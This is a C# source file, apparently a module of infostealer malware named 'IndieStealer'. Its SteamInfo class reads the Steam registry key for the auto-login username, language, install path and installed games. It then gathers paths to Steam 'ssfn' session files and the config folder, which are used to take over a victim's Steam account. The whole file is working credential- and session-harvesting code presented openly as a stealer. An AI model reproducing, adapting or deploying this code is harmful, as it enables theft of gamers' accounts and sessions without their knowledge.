using Microsoft.Win32;
using System.IO;

namespace IndieStealer.Collect
{
    class SteamInfo
    {
        public static string credentials = "";
        public static string[] sessionFiles = new string[3];

        public static void Collect()
        {
            try
            {
                using (RegistryKey reg = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Valve\Steam"))
                {
                    if (reg != null)
                    {
                        string userLogin = reg.GetValue("AutoLoginUser").ToString();
                        string language = reg.GetValue("Language").ToString();
                        string steamLocation = reg.GetValue("SteamPath").ToString();
                        string[] subKeyNames = reg.OpenSubKey("Apps").GetSubKeyNames();
                        string steamGames = "";
                        foreach (var subkey in subKeyNames)
                        {
                            string value = reg.OpenSubKey($@"Apps\{subkey}").GetValue("Name", "Error").ToString();
                            if (value != "Error")
                                steamGames += "\n" + value;                                         
                        }
                        credentials += $"\nLogin: {userLogin}" +
                                       $"\nLanguage: {language}" +
                                       $"\nLocation: " + steamLocation +
                                       "\n________________________" +
                                       $"\nGames:" +
                                       $"\n{steamGames}";

                        CollectSession(steamLocation);
                    }
                }
                
            }
            catch 
            {}
            
        }

        private static void CollectSession(string steamLocation)
        {
            if (steamLocation == "")
                return;
            sessionFiles = new string[3];
            int c = 0;
            FileInfo[] files = new DirectoryInfo(steamLocation).GetFiles();
            for (int i = 0; i < files.Length; i++)
            {
                if (files[i].Name.StartsWith("ssfn") && files[i].Name.Length > 15)
                    sessionFiles[c++] = files[i].FullName;
            }
            if (Directory.Exists(Path.Combine(steamLocation, "config")))
                sessionFiles[c] = Path.Combine(steamLocation, "config");
        }
    }
}
